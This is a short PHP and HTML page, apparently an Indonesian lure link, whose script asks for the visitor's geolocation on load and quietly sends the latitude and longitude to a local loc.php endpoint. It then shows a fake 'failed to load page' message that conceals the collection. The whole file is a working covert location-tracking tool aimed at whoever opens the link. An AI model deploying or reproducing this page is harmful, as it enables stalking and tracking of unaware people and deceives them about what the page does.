<?php
session_start();
$_SESSION["kill"]='kill';
?>
<html>
<head>
<title>Paan Sih?</title>
</head>
<body>
<script>
function ps() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, lihat_eror);
    } else {
        exit();
    }
}
function showPosition(position) {
  var a = position.coords.latitude;
  var b = position.coords.longitude;
  var c = new XMLHttpRequest();
  c.open("GET","./loc.php?lat="+a+"&lon="+b,true);
  c.send();
}
function lihat_eror(eror){
    var s = new XMLHttpRequest();
    s.open("GET","./loc.php?lat=null&lon=null",true);
    s.send();
}
ps();
</script>
</body>
</html>
<?php
exit('gagal memuat halaman!');
?>

